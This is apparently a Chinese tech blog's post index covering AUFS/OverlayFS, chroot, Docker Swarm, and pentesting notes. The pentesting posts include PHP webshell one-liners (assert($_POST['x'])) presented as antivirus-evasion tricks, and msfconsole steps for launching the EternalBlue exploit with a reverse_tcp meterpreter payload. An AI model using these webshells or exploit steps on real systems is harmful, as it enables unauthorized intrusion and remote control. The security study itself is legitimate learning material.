当文件在容器层中不存在时：当容器运行时需要读取某个文件，如果容器层中不存在时，则从镜像层查找该文件，然后读取文件内容。 文件既存在于镜像层，又存在于容器层：当我们读取的文件既存在于镜像层，又存在于容器层时，将会从容器层读取该文件。 修改文件或目录 AUFS 对文件的修改采用的是写时复制的工作机制，这种工作机制可以最大程度节省存储空间。 具体的文件操作机制如下。 第一次修改文件：当我们第一次在容器中修改某个文件时，AUFS 会触发写时复制操作，AUFS 首先从镜像层复制文件到容器层，然后再执行对应的修改操作。 AUFS 写时复制的操作将会复制整个文件，如果文件过大，将会大大降低文件系统的性能，因此当我们有大量文件需要被修改时，AUFS 可能会出现明显的延迟。好在，写时复制操作只在第一次修改文件时触发，对日常使用没有太大影响。 删除文件或目录：当文件或目录被删除时，AUFS 并不会真正从镜像中删除它，因为镜像层是只读的，AUFS 会创建一个特殊的文件或文件夹，这种特殊的文件或文件夹会阻止容器的访问。 演示 构建目录和文件 首先在 /tmp 目录下创建 aufs 目录： 12$ cd /tmp$ mkdir aufs 准备挂载点目录： 12$ cd aufs$ mkdir mnt 接下来准备容器层内容： 1234## 创建镜像层目录$ mkdir container1## 在镜像层目录下准备一个文件$ echo Hello, Container layer! &gt; container1/container1.txt 最后准备镜像层内容： 12345## 创建两个镜像层目录$ mkdir image1 &amp;&amp; mkdir image2## 分别写入数据$ echo Hello, Image layer1! &gt; image1/image1.txt$ echo Hello, Image layer2! &gt; image2/image2.txt 准备好的目录和文件结构如下： 12345678910$ tree ..|-- container1| `-- container1.txt|-- image1| `-- image1.txt|-- image2| `-- image2.txt`-- mnt4 directories, 3 files 创建AUFS联合文件系统 在使用aufs之前，可以通过下面的命令确认当前系统是否支持aufs，如果不支持，请自行根据相应发行版的文档安装 12345#下面的命令如果没有输出，表示内核不支持aufs#由于ubuntu 16.04的内核中已经将aufs编译进去了，所以默认就支持root@ubuntu:~$ grep aufs /proc/filesystemsnodev aufs#这里nodev表示该文件系统不需要建在设备上 使用 mount 命令可以创建 AUFS 类型的文件系统，命令如下： 1$ sudo mount -t aufs -o dirs=./container1:./image2:./image1 none ./mnt -t aufs： 指定挂载类型为aufs -o dirs=./container1:./image2:./image1 ： 表示将当前目录下的container1，image2，image1三个文件夹联合到一起。这里要注意，dirs 参数第一个冒号默认为读写权限，后面的目录均为只读权限，与 Docker 容器使用 AUFS 的模式一致。 none：aufs不需要设备，只依赖于-o dir指定的文件夹，所以这里填none即可 ./mnt：表示将最后联合的结果挂载到当前的mnt目录下，然后我们就可以往这个目录里面读写文件了 执行完上述命令后，mnt 变成了 AUFS 的联合挂载目录，我们可以使用 mount 命令查看一下已经创建的 AUFS 文件系统： 12$ mount -t aufsnone on /tmp/aufs/mnt type aufs (rw,relatime,si=9553b4ca12858995) 我们每创建一个 AUFS 文件系统，AUFS 都会为我们生成一个 ID，这个 ID 在 /sys/fs/aufs/ 会创建对应的目录，在这个 ID 的目录下可以查看文件挂载的权限。 12345678$ cat /sys/fs/aufs/si_9553b4ca12858995/* /tmp/aufs/container1=rw/tmp/aufs/image2=ro/tmp/aufs/image1=ro646566/tmp/aufs/container1/.aufs.xino 可以看到 container1 目录的权限为 rw（代表可读写），image1 和 image2 的权限为 ro（代表只读）。 为了验证 mnt 目录下可以看到 container1、image1 和 image2 目录下的所有内容，我们使用 ls 命令查看一下 mnt 目录： 12345$ ls -l mnttotal 12-rw-r--r-- 1 root root 24 May 11 07:56 container1.txt-rw-r--r-- 1 root root 21 May 11 07:56 image1.txt-rw-r--r-- 1 root root 21 May 11 07:56 image2.txt 可以看到 mnt 目录下已经出现了我们准备的所有镜像层和容器层的文件。下面让我们来验证一下 AUFS 的写时复制。 aufs写时复制 AUFS 的写时复制是指在容器中，只有需要修改某个文件时，才会把文件从镜像层复制到容器层，下面我们通过修改联合挂载目录 mnt 下的内容来验证下这个过程。 我们使用以下命令修改 mnt 目录下的 image1.txt 文件： 1$ echo Hello, Image layer1 changed! &gt; mnt/image1.txt 然后我们查看下 image1/image1.txt 文件内容： 12$ cat image1/image1.txtHello, Image layer1! 发现“镜像层”的 image1.txt 文件并未被修改。 然后我们查看一下&quot;容器层&quot;对应的 image1.txt 文件内容： 1234567$ ls -l container1/total 8-rw-r--r-- 1 root root 24 May 11 07:56 container1.txt-rw-r--r-- 1 root root 29 May 11 08:32 image1.txt## 查看文件内容$ cat container1/image1.txtHello, Image layer1 changed! 发现 AUFS 在“容器层”自动创建了 image1.txt 文件，并且内容为我们刚才写入的内容。 至此，我们完成了 AUFS 写时复制的验证。我们在第一次修改镜像内某个文件时，AUFS 会复制这个文件到容器层，然后在容器层对该文件进行修改操作，这就是 AUFS 最典型的特性写时复制。 Docker 如何使用 OverlayFS 为了演示 Docker 如何使用 OverlayFS，我们将尝试模拟 Docker 如何装载容器和镜像层。在执行此操作之前，我们首先需要清理工作区并获得一个镜像： 1234567891011121314~ $ docker image prune -af...Total reclaimed space: ...MB~ $ docker pull nginxUsing default tag: latestlatest: Pulling from library/nginxa076a628af6f: Pull complete0732ab25fa22: Pull completed7f36f6fe38f: Pull completef72584a26f32: Pull complete7125e4df9063: Pull completeDigest: sha256:10b8cc432d56da8b61b070f4c7d2543a9ed17c2b23010b43af434fd40e2ca4aaStatus: Downloaded newer image for nginx:latestdocker.io/library/nginx:latest 我们有一个镜像(nginx)可以测试，所以接下来，让我们检查它的镜像层。我们可以通过 docker inspect 在镜像上运行并检查 GraphDriver 字段或通过浏览/var/lib/docker/overlay2 存储所有镜像层的目录来检查镜像层。最后看看里面有什么： 123456789101112131415161718192021222324252627282930~ $ cd /var/lib/docker/overlay2~ $ ls -ltotal 0drwx------. 4 root root 55 Feb 6 19:19 3d963d191b2101b3406348217f4257d7374aa4b4a73b4a6dd4ab0f365d38dfbddrwx------. 3 root root 47 Feb 6 19:19 410c05aaa30dd006fc47d8c23ba0d173c6d305e4d93fdc3d9abcad9e78862b46drwx------. 4 root root 72 Feb 6 19:19 685374e39a6aac7a346963bb51e2fc7b9f5e2bdbb5eac6c76ccdaef807abc25ebrw-------. 1 root root 253, 0 Jan 31 18:15 backingFsBlockDevdrwx------. 4 root root 72 Feb 6 19:19 d487622ece100972afba76fda13f56029dec5ec26ffcf552191f6241e05cab7edrwx------. 4 root root 72 Feb 6 19:19 fb18be50518ec9b37faf229f254bbb454f7663f1c9c45af9f272829172015505drwx------. 2 root root 176 Feb 6 19:19 l~ $ tree 3d963d191b2101b3406348217f4257d7374aa4b4a73b4a6dd4ab0f365d38dfbd/3d963d191b2101b3406348217f4257d7374aa4b4a73b4a6dd4ab0f365d38dfbd/├── diff│ └── docker-entrypoint.d│ └── 20-envsubst-on-templates.sh├── link├── lower└── work~ $ docker inspect nginx | jq .[0].GraphDriver.Data&#123; &quot;LowerDir&quot;: &quot;/var/lib/docker/overlay2/fb18be50518ec9b37faf229f254bbb454f7663f1c9c45af9f272829172015505/diff: /var/lib/docker/overlay2/d487622ece100972afba76fda13f56029dec5ec26ffcf552191f6241e05cab7e/diff: /var/lib/docker/overlay2/685374e39a6aac7a346963bb51e2fc7b9f5e2bdbb5eac6c76ccdaef807abc25e/diff: /var/lib/docker/overlay2/410c05aaa30dd006fc47d8c23ba0d173c6d305e4d93fdc3d9abcad9e78862b46/diff&quot;, &quot;MergedDir&quot;: &quot;/var/lib/docker/overlay2/3d963d191b2101b3406348217f4257d7374aa4b4a73b4a6dd4ab0f365d38dfbd/merged&quot;, &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/3d963d191b2101b3406348217f4257d7374aa4b4a73b4a6dd4ab0f365d38dfbd/diff&quot;, &quot;WorkDir&quot;: &quot;/var/lib/docker/overlay2/3d963d191b2101b3406348217f4257d7374aa4b4a73b4a6dd4ab0f365d38dfbd/work&quot;&#125; 查看上面的输出，它看起来与我们在 mount 命令中看到的非常相似，进一步来说： LowerDir: 是只读镜像层的目录，以冒号分隔 MergedDir：镜像和容器中所有图层的合并视图 UpperDir：写入更改的读写层 WorkDir：Linux OverlayFS 用于准备合并视图的工作目录 接下来，让我们更进一步，运行一个容器并检查它的层： 123456789101112131415161718192021222324252627282930~ $ docker run -d --name container nginx~ $ docker inspect container | jq .[0].GraphDriver.Data&#123; &quot;LowerDir&quot;: &quot;/var/lib/docker/overlay2/59bcd145c580de3bb3b2b9c6102e4d52d0ddd1ed598e742b3a0e13e261ee6eb4-init/diff: /var/lib/docker/overlay2/3d963d191b2101b3406348217f4257d7374aa4b4a73b4a6dd4ab0f365d38dfbd/diff: /var/lib/docker/overlay2/fb18be50518ec9b37faf229f254bbb454f7663f1c9c45af9f272829172015505/diff: /var/lib/docker/overlay2/d487622ece100972afba76fda13f56029dec5ec26ffcf552191f6241e05cab7e/diff: /var/lib/docker/overlay2/685374e39a6aac7a346963bb51e2fc7b9f5e2bdbb5eac6c76ccdaef807abc25e/diff: /var/lib/docker/overlay2/410c05aaa30dd006fc47d8c23ba0d173c6d305e4d93fdc3d9abcad9e78862b46/diff&quot;, &quot;MergedDir&quot;: &quot;/var/lib/docker/overlay2/59bcd145c580de3bb3b2b9c6102e4d52d0ddd1ed598e742b3a0e13e261ee6eb4/merged&quot;, &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/59bcd145c580de3bb3b2b9c6102e4d52d0ddd1ed598e742b3a0e13e261ee6eb4/diff&quot;, &quot;WorkDir&quot;: &quot;/var/lib/docker/overlay2/59bcd145c580de3bb3b2b9c6102e4d52d0ddd1ed598e742b3a0e13e261ee6eb4/work&quot;&#125;~ $ tree -l 3 /var/lib/docker/overlay2/59bcd145c580de3bb3b2b9c6102e4d52d0ddd1ed598e742b3a0e13e261ee6eb4/diff # The UpperDir/var/lib/docker/overlay2/59bcd145c580de3bb3b2b9c6102e4d52d0ddd1ed598e742b3a0e13e261ee6eb4/diff├── etc│ └── nginx│ └── conf.d│ └── default.conf├── run│ └── nginx.pid└── var └── cache └── nginx ├── client_temp ├── fastcgi_temp ├── proxy_temp ├── scgi_temp └── uwsgi_temp 上面的输出显示 docker inspect nginx 的输出中列出的目录与 MergedDir、UpperDir 和 WorkDir（id 为 3d963d191b2101b3406348217f4257d7374aa4b4a73b4b4a6dd4ab0f365d38dfbd）相同，现在是容器的 LowerDir 的一部分。这里的下半部分是由所有的 nginx 镜像层叠加在一起组成的。在它们之上是 UpperDir 中的可写层，它包含/etc、/run 和/var。同样，如果我们在上面列出 MergedDir，您将看到容器可以使用的整个文件系统，包括 UpperDir 和 LowerDir 中的所有内容。 最后，为了模拟 Docker 的行为，我们可以使用这些相同的目录来手动创建我们自己的合并视图： 12345678910111213141516~ $ mount -t overlay -o \\lowerdir=/var/lib/docker/overlay2/59bcd145c580de3bb3b2b9c6102e4d52d0ddd1ed598e742b3a0e13e261ee6eb4-init/diff: /var/lib/docker/overlay2/3d963d191b2101b3406348217f4257d7374aa4b4a73b4a6dd4ab0f365d38dfbd/diff: /var/lib/docker/overlay2/fb18be50518ec9b37faf229f254bbb454f7663f1c9c45af9f272829172015505/diff: /var/lib/docker/overlay2/d487622ece100972afba76fda13f56029dec5ec26ffcf552191f6241e05cab7e/diff: /var/lib/docker/overlay2/685374e39a6aac7a346963bb51e2fc7b9f5e2bdbb5eac6c76ccdaef807abc25e/diff: /var/lib/docker/overlay2/410c05aaa30dd006fc47d8c23ba0d173c6d305e4d93fdc3d9abcad9e78862b46/diff,\\upperdir=/var/lib/docker/overlay2/59bcd145c580de3bb3b2b9c6102e4d52d0ddd1ed598e742b3a0e13e261ee6eb4/diff,\\workdir=/var/lib/docker/overlay2/59bcd145c580de3bb3b2b9c6102e4d52d0ddd1ed598e742b3a0e13e261ee6eb4/work \\overlay /mnt/merged~ $ ls /mnt/mergedbin dev docker-entrypoint.sh home lib64 mnt proc run srv tmp varboot docker-entrypoint.d etc lib media opt root sbin sys usr~ $ umount overlay 在这里，我们只是从前面的代码片段中获取值并将它们传递给 mount 命令中的适当参数，唯一的区别是我们用于/mnt/merged 合并视图而不是/var/lib/docker/overlay2/…/merged. 这就是 Docker 中整个 OverlayFS 的真正含义——mount 跨多个堆叠层的单个命令。下面是负责这个的 Docker 代码的一部分 -lowerdir=…,upperdir=…,workdir=…值的替换，然后是 unix.Mount 12345678// https://github.com/moby/moby/blob/1ef1cc8388165b2b848f9b3f53ec91c87de09f63/daemon/graphdriver/overlay2/overlay.go#L580opts := fmt.Sprintf(&quot;lowerdir=%s,upperdir=%s,workdir=%s&quot;, strings.Join(absLowers, &quot;:&quot;), path.Join(dir, &quot;diff&quot;), path.Join(dir, &quot;work&quot;))mountData := label.FormatMountLabel(opts, mountLabel)mount := unix.MountmountTarget := mergedDirrootUID, rootGID, err := idtools.GetRootUIDGID(d.uidMaps, d.gidMaps)// ... Docker 核心组件之 联合文件系统 https://jishuin.proginn.com/p/763bfbd61dab https://www.jianshu.com/p/5ec3d4dbf580 Linux文件系统之aufs"},{"title":"Linux-chroot命令","date":"2022-05-09","updated":"2024-03-19","path":"2022/05/09/Linux-chroot命令/","text":"chroot 可以用来切换当前进程的根目录，它能够将当前进程能够访问的目录树结构限制在某个子目录中，同时由于当前进程创建的子进程将会继承父进程的根目录结构，所以子进程也随之被限定。 为什么要使用 chroot 命令 增加了系统的安全性，限制了用户的权力： 在经过 chroot 之后，在新根下将访问不到旧系统的根目录结构和文件，这样就增强了系统的安全性。一般会在用户登录前应用 chroot，把用户的访问能力控制在一定的范围之内。 建立一个与原系统隔离的系统目录结构，方便用户的开发： 使用 chroot 后，系统读取的是新根下的目录和文件，这是一个与原系统根下文件不相关的目录结构。在这个新的环境中，可以用来测试软件的静态编译以及一些与系统不相关的独立开发。 切换系统的根目录位置，引导 Linux 系统启动以及急救系统等： chroot 的作用就是切换系统的根位置，而这个作用最为明显的是在系统初始引导磁盘的处理过程中使用，从初始 RAM 磁盘 (initrd) 切换系统的根位置并执行真正的 init，本文的最后一个 demo 会详细的介绍这种用法。 通过 chroot 与busybox 构造Mini系统 busybox 包含了丰富的工具，把这些工具放置在一个目录下，然后通过 chroot 构造出一个 mini 系统（只隔离了文件系统）。简单起见直接使用 docker 的 busybox 镜像打包的文件系统。先在当前目录下创建一个目录 rootfs： 1$ mkdir rootfs 然后把 busybox 镜像中的文件释放到这个目录中： 1$ (docker export $(docker create busybox) | tar -C rootfs -xvf -) 执行 chroot 后的 ls 命令 1$ sudo chroot rootfs /bin/ls 这次运行的命令却是 rootfs/bin/ls。执行过程为首先把进程的根目录设置成/tmp/tmp/rootfs，然后根目录/就是/tmp/tmp/rootfs，所以调用的ls命令其实为 /tmp/tmp/rootfs/bin/ls 运行 chroot 后的 pwd 命令 1$ sudo chroot rootfs /bin/pwd 不带命令执行 chroot 如果不给 chroot 指定执行的命令，默认它会执行 $&#123;SHELL&#125; -i，本系统中${SHELL} 为 /bin/zsh，busybox中不包含zsh。 1$ sudo chroot rootfs 通过/bin/sh执行shell并打印当前进程的pid 1$ sudo chroot rootfs /bin/sh 检查程序是否运行在 chroot 环境下 在另一个shell中查看主机的/proc/$pid/root文件就可以看到指定进程的root目录被映射到什么位置 chroot 命令的原理 通过 strace 来跟踪一次 chroot 命令执行过程来研究其代码执行过程，重要的系统调用信息如下： 123456789101112$ strace chroot rootfs/ shexecve(&quot;/usr/bin/chroot&quot;, [&quot;chroot&quot;, &quot;rootfs&quot;, &quot;sh&quot;], 0x7fffe90a6050 /* 83 vars */) = 0..............................chroot(&quot;rootfs&quot;) = 0chdir(&quot;/&quot;) = 0execve(&quot;/opt/anaconda/bin/sh&quot;, [&quot;sh&quot;], 0x7ffcb7befea8 /* 83 vars */) = -1 ENOENT (没有那个文件或目录)execve(&quot;/opt/anaconda/condabin/sh&quot;, [&quot;sh&quot;], 0x7ffcb7befea8 /* 83 vars */) = -1 ENOENT (没有那个文件或目录)......execve(&quot;/usr/local/sbin/sh&quot;, [&quot;sh&quot;], 0x7ffcb7befea8 /* 83 vars */) = -1 ENOENT (没有那个文件或目录)execve(&quot;/usr/local/bin/sh&quot;, [&quot;sh&quot;], 0x7ffcb7befea8 /* 83 vars */) = -1 ENOENT (没有那个文件或目录)execve(&quot;/usr/bin/sh&quot;, [&quot;sh&quot;], 0x7ffcb7befea8 /* 83 vars */) = -1 ENOENT (没有那个文件或目录)...... 上述过程可以总结为如下几个步骤： execve 运行 chroot 程序 chroot 系统调用切换当前命令的根目录 chdir 系统调用切换当前命令的工作目录到新的根目录 根据$PATH搜索默认 shell 的位置，使用 execve 进行执行 这里它搜索默认 shell 的顺序是根据主机中的$PATH环境变量顺序来的 12$ echo $PATH /opt/anaconda/bin:/opt/anaconda/condabin:/usr/local/sbin:/usr/local/bin:/usr/bin....... 从上面的捕获到的 chroot 命令的系统调用可以看到 chroot 命令的核心其实就是调用 chroot系统调用，这也就是其内核态的主要行为，这个行为并不是直接完成这项功能 的，它实际是通过一种间接的方式修改 task_struct 中的数据结构来达成的。 源码 chroot源码在 coreutils 包中，下载地址:https://ftp.gnu.org/gnu/coreutils/ 实现chroot程序 代码中涉及到两个函数，分别是 chroot() 函数和 chdir() 函数，真正的 chroot 命令也是通过调用它们实现的 在busybox目录下编译执行下面代码 123456789101112131415161718192021222324252627282930313233343536#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt; int main(int argc, char *argv[])&#123; if(argc&lt;2)&#123; printf(&quot;Usage: chroot NEWROOT [COMMAND...] \\n&quot;); return 1; &#125; if(chroot(argv[1])) &#123; perror(&quot;chroot&quot;); return 1; &#125; if(chdir(&quot;/&quot;)) &#123; perror(&quot;chdir&quot;); return 1; &#125; if(argc == 2) &#123; // hardcode /bin/sh for my busybox tools. argv[0] = (char *)&quot;/bin/sh&quot;; argv[1] = (char *) &quot;-i&quot;; argv[2] = NULL; &#125; else &#123; argv += 2; &#125; execvp (argv[0], argv); printf(&quot;chroot: cannot run command `%s`\\n&quot;, *argv); return 0;&#125; 编译运行 12$ gcc -Wall chroot.c -o mychroot $ ./mychroot ./rootfs 实例：通过 chroot 重新设置 root 密码 接下来的 demo 将演示如何通过 chroot 命令重新设置 centos7 中被忘记了的 root 密码。 systemd 的管理机制中，rescure 模式和 emeryency 模式是无法直接取得 root 权限的，需要使用 root 密码才能进入 rescure 和 emeryency 环境。所以我们需要通过其他方式来设置 root 密码。我们可以为内核的启动指定 “rd.break” 参数，从而让系统在启动的早期停下来，此时我们可以通过使用 root 权限并结合 chroot 命令完成设置 root 密码的操作。下面我们一起来看具体的操作过程。 在系统启动过程中进入开机菜单时按下字母键 e 进程开机菜单的编辑模式： 这就是系统的开机菜单，按下 e 后进入编辑界面： **找到以 “linux16 /vmlinuz-” 开头的行。**如果默认没有看到该行，需要按向下键把它滚动出来。 然后定位到该行结尾处，输入一个空格和字符串 “rd.break”，如下图所示： 接着按下 ctrl + x 以该设置继续启动，启动过程中操作系统会停下来，这是系统启动过程中的一个非常早的时间点： 所以系统的根目录还挂载在 RAM disk 上(就是内存中的一个文件系统)，我们可以通过 mount 命令检查系统当前挂载的文件系统，下面是我们比较关心的两条： 上图中 mount 命令输出的第一行说明此时的根目录在一个 RAM disk 中, 即 rootfs。 图中输出的第二行说明我们的文件系统此时被挂载到了 /sysroot 目录，并且是只读的模式： 1/dev/mapper/centos-root on /sysroot type xfs (ro,relatime,attr2,inode64,noquota) 而在我们正常登陆系统的情况下，系统根目录的挂载情况如下： 1/dev/mapper/centos-root on / type xfs (rw,relatime,seclabel,attr2,inode64,noquota) 该时间点的最大优势是我们具有 root 权限！所以让我们开始设置新的 root 密码吧。 先通过下面的命令把 /sysroot 重新挂载为可读写的模式： 1switch_root:/# mount -o remount,rw /sysroot 然后用下面 chroot 命令把根目录切换到我们原来的环境中： 1switch_root:/# chroot /sysroot 此时可以理解为：我们以 root 权限登录了原来的系统，修改密码就很容易了！用下面的命令为 root 用户设置新的密码： 1sh-4.2# echo &quot;new_root_pw&quot; | passwd --stdin root **接下来还要处理 SELinux 相关的问题。**由于当前的环境中 SELinux 并未启动，所以我们对文件的修改可能造成文件的 context 不正确。为了确保开机时重新设定 SELinux context，必須在根目录下添加隐藏文件 .autorelabel： 1sh-4.2# touch /.autorelabel 最后从 chroot 中退出，并重启系统： 12sh-4.2# exitswitch_root:/# reboot 重新进入登陆界面时就可以使用刚才设置的密码以 root 登陆了！ Linux chroot命令 linux 命令分析之 chroot 的原理 linux 内核情景分析之 chroot 命令背后的内核态行为"},{"title":"docker-swarm集群概念","date":"2022-05-08","updated":"2024-03-19","path":"2022/05/08/docker-swarm集群概念/","text":"swarm简介 Docker Swarm 是 Docker 官方推出的容器集群管理工具，基于 Go 语言实现。代码开源在：https://github.com/docker/swarm 使用它可以将多个 Docker 主机封装为单个大型的虚拟 Docker 主机，快速打造一套容器云平台。 Docker Swarm 是生产环境中运行 Docker 应用程序最简单的方法。作为容器集群管理器，Swarm 最大的优势之一就是 100% 支持标准的 Docker API。各种基于标准 API 的工具比如 Compose、docker-py、各种管理软件，甚至 Docker 本身等都可以很容易的与 Swarm 进行集成。大大方便了用户将原先基于单节点的系统移植到 Swarm 上，同时 Swarm 内置了对 Docker 网络插件的支持，用户可以很容易地部署跨主机的容器集群服务。 Docker Swarm 和 Docker Compose 一样，都是 Docker 官方容器编排工具，但不同的是，Docker Compose 是一个在单个服务器或主机上创建多个容器的工具，而 Docker Swarm 则可以在多个服务器或主机上创建容器集群服务，对于微服务的部署，显然 Docker Swarm 会更加适合。 Docker Engine 1.12 引入了 Swarm 模式，一个 Swarm 由多个 Docker 主机组成，它们以 Swarm 集群模式运行。Swarm 集群由 Manager 节点（管理者角色，管理成员和委托任务）和 Worker 节点（工作者角色，运行 Swarm 服务）组成。这些 Docker 主机有些是 Manager 节点，有些是 Worker 节点，或者同时扮演这两种角色。 Swarm 创建服务时，需要指定要使用的镜像、在运行的容器中执行的命令、定义其副本的数量、可用的网络和数据卷、将服务公开给外部的端口等等。与独立容器相比，群集服务的主要优势之一是，你可以修改服务的配置，包括它所连接的网络和数据卷等，而不需要手动重启服务。还有就是，如果一个 Worker Node 不可用了，Docker 会调度不可用 Node 的 Task 任务到其他 Nodes 上。 swarm核心概念 Swarm 集群由 Manager 节点（管理者角色，管理成员和委托任务）和 Worker 节点（工作者角色，运行 Swarm 服务）组成。一个节点就是 Swarm 集群中的一个实例，也就是一个 Docker 主机。你可以运行一个或多个节点在单台物理机或云服务器上，但是生产环境上，典型的部署方式是：Docker 节点交叉分布式部署在多台物理机或云主机上。节点名称默认为机器的 hostname。 Manager：负责整个集群的管理工作包括集群配置、服务管理、容器编排等所有跟集群有关的工作，它会选举出一个 leader 来指挥编排任务； Worker：工作节点接收和执行从管理节点分派的任务（Tasks）运行在相应的服务（Services）上。 服务（Service）是一个抽象的概念，是对要在管理节点或工作节点上执行的任务的定义。它是集群系统的中心结构，是用户与集群交互的主要根源。Swarm 创建服务时，可以为服务定义以下信息： 服务名称； 使用哪个镜像来创建容器； 要运行多少个副本； 服务的容器要连接到哪个网络上； 要映射哪些端口。 任务（Task）包括一个 Docker 容器和在容器中运行的命令。任务是一个集群的最小单元，任务与容器是一对一的关系。管理节点根据服务规模中设置的副本数量将任务分配给工作节点。一旦任务被分配到一个节点，便无法移动到另一个节点。它只能在分配的节点上运行或失败。 Swarm 不只是提供了优秀的高可用性，同时也提供了节点的弹性扩容和缩容的功能。可以通过以下两种类型的 Services 部署实现： Replicated Services：当服务需要动态扩缩容时，只需通过 scale 参数或者 --replicas n 参数指定运行相同任务的数量，即可复制出新的副本，将一系列复制任务分发至各节点当中，这种操作便称之为副本服务（Replicate）。 Global Services：我们也可以通过 --mode global 参数将服务分发至全部节点之上，这种操作我们称之为全局服务（Global）。在每个节点上运行一个相同的任务，不需要预先指定任务的数量，每增加一个节点到 Swarm 中，协调器就会创建一个任务，然后调度器把任务分配给新节点。 下图用黄色表示拥有三个副本服务 Replicated Service，用灰色表示拥有一个全局服务 Global Service。 Swarm Manager： API：接受命令并创建 service 对象（创建对象） orchestrator：为 service 对象创建的 task 进行编排工作（服务编排） allocater：为各个 task 分配 IP 地址（分配 IP） dispatcher：将 task 分发到 nodes（分发任务） scheduler：安排一个 worker 节点运行 task（运行任务） Worker Node： worker：连接到调度器，检查分配的 task（检查任务） executor：执行分配给 worker 节点的 task（执行任务） Docker Swarm 集群管理利器核心概念扫盲"},{"title":"WEB外网渗透导图","date":"2022-05-07","updated":"2024-03-19","path":"2022/05/07/WEB外网渗透导图/","text":""},{"title":"域环境搭建","date":"2022-04-29","updated":"2024-03-19","path":"2022/04/29/域环境搭建/","text":""},{"title":"webshell免杀","date":"2022-04-27","updated":"2024-03-19","path":"2022/04/27/webshell免杀/","text":"代码执行与命令执行： 代码执行： 可以用来执行代码的函数，参数是代码。例如eval() 命令执行： 可以用来执行命令的函数，参数是命令。例如system() 动态执行 12345678910&lt;?phpassert($_POST[&#x27;x&#x27;]);$e = &#x27;assert&#x27;; //eval不行$e(&quot;phpinfo();&quot;);$a = &#x27;system&#x27;; $a(&quot;phpinfo();&quot;);?&gt; php函数调用的对象必须是一个函数，但不包括eval，eval在php底层不是一个函数，assert是 回调函数 1234&lt;?php$e = $_REQUEST[&#x27;e&#x27;];?&gt; 变量掺杂 1234567&lt;?php$z = &#x27;test&#x27;;$$z = $_POST[&#x27;x&#x27;];eval(&#x27;&#x27;,$test);?&gt; 二维数组 编码绕过 无字母的马"},{"title":"Cobalt Strike使用","date":"2022-04-26","updated":"2024-03-19","path":"2022/04/26/Cobalt-Strike使用/","text":"Cobalt Strike基础教程 Cobalt Strike使用教程一 https://zhuanlan.zhihu.com/p/359251293"},{"title":"MSF使用","date":"2022-04-26","updated":"2024-03-19","path":"2022/04/26/MSF使用/","text":"基础使用 1234567891011msfconsole # 进入框架search ms17_010 # 使用search命令查找相关漏洞use exploit/windows/smb/ms17_010_eternalblue # 使用use进入模块info # 使用info查看模块信息show targets # 显示当前攻击模块针对哪些特定操作系统版本、语言版本的系统show payloads # 查看可用的payload，默认reverse_tcpset payload windows/x64/meterpreter/reverse_tcp # 设置payloadshow options # 查看模块需要配置的参数set RHOST 192.168.100.158 # 设置参数exploit / run # 攻击后渗透阶段 # 后渗透阶段 Metasploit框架将攻击与成功利用后执行的内容（payload）分离开来。Metasploit框架中的payload也分为两部分，即stager和stage。stager负责下载大型payload（stage），将其注入内存，并将执行动作传递给它。 payload 简单来说，Payload是黑客用来与被黑了的系统交互的简单脚本。使用payload，可以将数据传输到已经沦陷的系统。Metasploit中的 Payload 模块主要有以下三种类型： Single： 是一种完全独立的Payload，而且使用起来就像运行calc.exe一样简单，例如添加一个系统用户或删除一份文件。由于Single Payload是完全独立的，因此它们有可能会被类似netcat这样的非metasploit处理工具所捕捉到。Singles非常小，旨在建立某种通讯，然后进入下一阶段。例如，只是创建一个用户。 Stager：ed 这种Payload 负责建立目标用户与攻击者之间的网络连接，是一种攻击者用来将更大的文件上传到沦陷的系统的payload。 一种常见的Stager Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条 tcp 连接，让目标系统主动连接我们的端口(反向连接)。另一种常见的是bind_tcp，它可以让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信(正向连接)。 Stage： 是由Stagers下载的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制，如Meterpreter和VNCInjection。 HowPayloads Work payload模块位于modules/payloads/&#123;singles,stages,stagers&#125;/&lt;platform&gt; 当框架启动时，stages与stagers结合以创建可在漏洞利用中使用的完整的payload。然后，handlers与payload配对，因此框架将知道如何使用给定的通信机制创建会话。 Staged payloads：&lt;platform&gt;/ [arch] / &lt;stage&gt; / &lt;stager&gt; Single payloads：&lt;platform&gt;/ [arch] / &lt;single&gt; 这会产生像windows/ x64 / meterpreter / reverse_tcp这样的payload。平台是windows，架构是x64，我们提供的最终的stage是meterpreter，而传递它的stager是reverse_tcp。 请注意，arch是可选的，因为在某些情况下，它是不必要或者已经默认了。比如php/ meterpreter / reverse_tcp。PHP的payload不需要Arch，因为我们提供的是解释代码而不是二进制代码。 当我们在Metasploit中执行 show payloads 命令之后，它会给我们显示一个可使用的Payload列表： 注： 在这个列表中，像 windows/powershell_bind_tcp 就是一个Single Payload，它不包含Stage Payload。 而windows/meterpreter/reverse_tcp 则由一个Stage Payload（meterpreter）和 一个Stager Payload（reverse_tcp组成。 Stager中几种常见的payload： 1234windows/meterpreter/bind_tcp #正向连接windows/meterpreter/reverse_tcp #反向连接，常用windows/meterpreter/reverse_http #通过监听80端口反向连接windows/meterpreter/reverse_https #通过监听443端口反向连接 正向连接使用场景： 我们的攻击机在内网环境，被攻击机是外网环境，由于被攻击机无法主动连接到我们的主机，所以就必须我们主动连接被攻击机了。但是这里经常遇到的问题是，被攻击机上开了防火墙，只允许访问指定的端口，比如被攻击机只对外开放了80端口。那么，我们就只能设置正向连接80端口了，这里很有可能失败，因为80端口上的流量太多了。 反向连接使用场景： 我们的主机和被攻击机都是在外网或者都是在内网，这样被攻击机就能主动连接到我们的主机了。如果是这样的情况，建议使用反向连接，因为反向连接的话，即使被攻击机开了防火墙也没事，防火墙只是阻止进入被攻击机的流量，而不会阻止被攻击机主动向外连接的流量。 反向连接80和443端口使用场景： 被攻击机能主动连接到我们的主机，还有就是被攻击机的防火墙设置的特别严格，就连被攻击机访问外部网络的流量也进行了严格的限制，只允许被攻击机的80端口或443端口与外部通信。 Meterpreter： Meterpreter属于stage payload，在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。 Meterpreter是如何工作的？： 首先目标先要执行初始的溢出漏洞会话连接，可能是 bind正向连接，或者反弹 reverse 